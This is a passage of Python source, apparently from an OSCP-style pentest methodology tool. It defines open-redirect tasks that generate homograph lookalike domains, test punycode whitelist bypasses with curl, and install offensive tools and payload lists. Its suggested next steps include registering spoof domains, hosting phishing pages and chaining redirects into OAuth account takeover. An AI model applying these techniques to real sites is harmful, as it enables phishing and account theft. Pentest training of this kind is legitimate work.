            'type': 'parent',
            'children': [
                # Homograph domain generation
                {
                    'id': f'homograph-gen-{port}',
                    'name': 'Generate Homograph Domains',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Install dnstwist (if not installed)\nif ! command -v dnstwist &> /dev/null; then\n  pip3 install dnstwist\nfi\n\n# Generate homograph variations\ndnstwist --registered --format cli {target} | grep "homograph" | tee homograph_domains.txt\n\n# Manual: Create homograph with Unicode\n# Example: Replace "a" with Cyrillic "а" (U+0430)\n# target.com → tаrget.com (looks identical but different Unicode)\n# Punycode: xn--trget-3we.com\n\necho "Homograph domains (visual spoofs):"\ncat homograph_domains.txt',
                        'description': 'Generate visually similar domains using Unicode homoglyphs for phishing',
                        'tags': ['OSCP:MEDIUM', 'RECON', 'AUTOMATED'],
                        'flag_explanations': {
                            'dnstwist': 'Domain name permutation engine',
                            '--registered': 'Check if domains are already registered',
                            '--format cli': 'Output in CLI-friendly format',
                            'grep "homograph"': 'Filter for homograph variants only'
                        },
                        'success_indicators': [
                            'Unregistered homograph domains found',
                            'Punycode domains generated',
                            'Visually identical spoofs discovered'
                        ],
                        'failure_indicators': [
                            'All homograph domains already registered',
                            'Target domain has no good homograph candidates',
                            'dnstwist finds no variations'
                        ],
                        'next_steps': [
                            'Register unregistered homograph domains',
                            'Set up phishing page on homograph domain',
                            'Test if target\'s email/web filters detect homograph',
                            'Use in open redirect chain: redirect to homograph domain'
                        ],
                        'alternatives': [
                            'Manual: Use Unicode character charts to find look-alikes',
                            'urlcrazy {target} | grep homograph (alternative tool)',
                            'Manual: Check dnstwist.it for pre-generated homographs',
                            'Python unicodedata module for character lookup',
                            'Manual: Replace ASCII with Cyrillic/Greek equivalents'
                        ],
                        'notes': 'Homograph attack: Replace ASCII characters with visually identical Unicode (Cyrillic, Greek, Armenian). Example: "a" (U+0061) → "а" (U+0430 Cyrillic). Browser shows identical, but different domain. Punycode: xn--... encoding for IDN. Use cases: 1) Phishing (visual spoof), 2) Open redirect to homograph (bypass whitelist), 3) CORS bypass if *.target.com allows Unicode. Common substitutions: a→а (Cyrillic), e→е (Cyrillic), o→о (Cyrillic), p→р (Cyrillic), c→с (Cyrillic). OSCP: Demonstrates social engineering + Unicode knowledge.'
                    }
                },

                # Testing IDN homograph in open redirect
                {
                    'id': f'idn-redirect-test-{port}',
                    'name': 'Test IDN/Punycode in Redirects',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if redirect validator allows punycode/IDN domains as whitelist bypass',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                        'alternatives': [
                            f'# Convert homograph to punycode\n# Example: tаrget.com (Cyrillic а) → xn--trget-3we.com\n# Test: Does validator allow punycode?\ncurl -s -I "{base_url}/redirect?url=http://xn--trget-3we.com" | grep Location',
                            f'# Test Unicode domain directly (if validator allows)\ncurl -s -I "{base_url}/redirect?url=http://tаrget.com" | grep Location\n# Note: Copy-paste may normalize; use URL encoding',
                            f'# Test in whitelist context\n# If validator allows {target}:\ncurl -s -I "{base_url}/redirect?url=http://xn--trget-3we.com" | grep Location\n# Does validator recognize punycode as different domain?',
                            '# Manual: Test in browser\n# 1. Set up page on homograph domain\n# 2. Use open redirect: ?url=http://homograph-domain.com\n# 3. Verify victim sees trusted-looking domain in browser'
                        ],
                        'success_indicators': [
                            'Punycode domain bypasses whitelist check',
                            'Redirect to homograph domain succeeds',
                            'Validator does not decode punycode before checking',
                            'Browser shows homograph domain (looks like trusted domain)'
                        ],
                        'failure_indicators': [
                            'Validator decodes punycode and blocks',
                            'Browser shows punycode (xn--...) instead of Unicode',
                            'Whitelist check includes punycode variants'
                        ],
                        'next_steps': [
                            'Set up phishing page on homograph domain',
                            'Chain with OAuth redirect_uri for account takeover',
                            'Test if Same-Site cookies allow homograph subdomain',
                            'Document browser behavior (Chrome vs Firefox vs Safari)'
                        ],
                        'notes': 'IDN homograph in open redirect: If validator checks "target.com", try punycode "xn--trget-3we.com" (Cyrillic а). Validator may not decode punycode → bypass. Browser displays Unicode (looks like target.com) but actually xn--... domain. Impact: Phishing with visually identical domain. Modern browsers show punycode in address bar if mixed scripts detected (security measure). Test in Firefox (better Unicode rendering) and Chrome (stricter punycode display). OSCP: Advanced technique demonstrating encoding expertise.'
                    }
                }
            ]
        })

        # === PHASE 6: Tools & References ===
        tasks['children'].append({
            'id': f'redirect-tools-{port}',
            'name': 'Tools & Reference',
            'type': 'parent',
            'children': [
                {
                    'id': f'tool-installation-{port}',
                    'name': 'Install Open Redirect Tools',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Install and configure tools for open redirect and subdomain takeover',
                        'tags': ['OSCP:LOW', 'MANUAL', 'SETUP'],
                        'alternatives': [
                            '# OpenRedireX (open redirect fuzzer)\ngit clone https://github.com/devanshbatham/OpenRedireX ~/tools/OpenRedireX\ncd ~/tools/OpenRedireX && chmod +x setup.sh && ./setup.sh',
                            '# Oralyzer (open redirect analyzer)\ngit clone https://github.com/0xNanda/Oralyzer ~/tools/Oralyzer\ncd ~/tools/Oralyzer && pip3 install -r requirements.txt',
                            '# subzy (subdomain takeover)\ngo install github.com/PentestPad/subzy@latest',
                            '# subjack (subdomain takeover)\ngo install github.com/haccer/subjack@latest',
                            '# dnsReaper (subdomain takeover)\ngit clone https://github.com/punk-security/dnsReaper ~/tools/dnsReaper\ncd ~/tools/dnsReaper && pip3 install -r requirements.txt',
                            '# dnstwist (homograph domains)\npip3 install dnstwist',
                            '# recollapse (Unicode fuzzing)\ngit clone https://github.com/0xacb/recollapse ~/tools/recollapse\ncd ~/tools/recollapse && pip3 install -r requirements.txt',
                            '# gau (URL discovery)\ngo install github.com/lc/gau/v2/cmd/gau@latest'
                        ],
                        'notes': 'Tool recommendations: OpenRedireX (best for fuzzing), Oralyzer (best for analysis), subzy (fastest takeover detection), subjack (most fingerprints), dnstwist (homograph generation), recollapse (Unicode bypass). All tools available on Kali or via go install/pip3. Time: 10-15 min to install all.'
                    }
                },

                {
                    'id': f'payload-lists-{port}',
                    'name': 'Download Payload Lists',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Download curated payload lists for open redirect testing',
                        'tags': ['OSCP:LOW', 'MANUAL', 'SETUP'],
                        'alternatives': [
                            '# PayloadsAllTheThings - Open Redirect\nwget -O open_redirect_payloads.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Open%20Redirect/Intruder/Open_Redirect_payloads.txt',
                            '# Open Redirect Payloads by cujanovic\ngit clone https://github.com/cujanovic/Open-Redirect-Payloads ~/tools/Open-Redirect-Payloads',
                            '# Unicode normalization table\nwget -O unicode_normalization.html https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html\nwget -O normalization_table.txt https://0xacb.com/normalization_table',
                            '# Homograph character lists\nwget -O homoglyphs.txt https://raw.githubusercontent.com/codebox/homoglyph/master/data/chars.txt'
                        ],
                        'notes': 'Payload sources: PayloadsAllTheThings (comprehensive), cujanovic repo (categorized by technique), unicode_normalization.html (visual reference), normalization_table (programmatic use). Keep payloads updated: git pull regularly.'
                    }
                }
            ]
        })

        return tasks
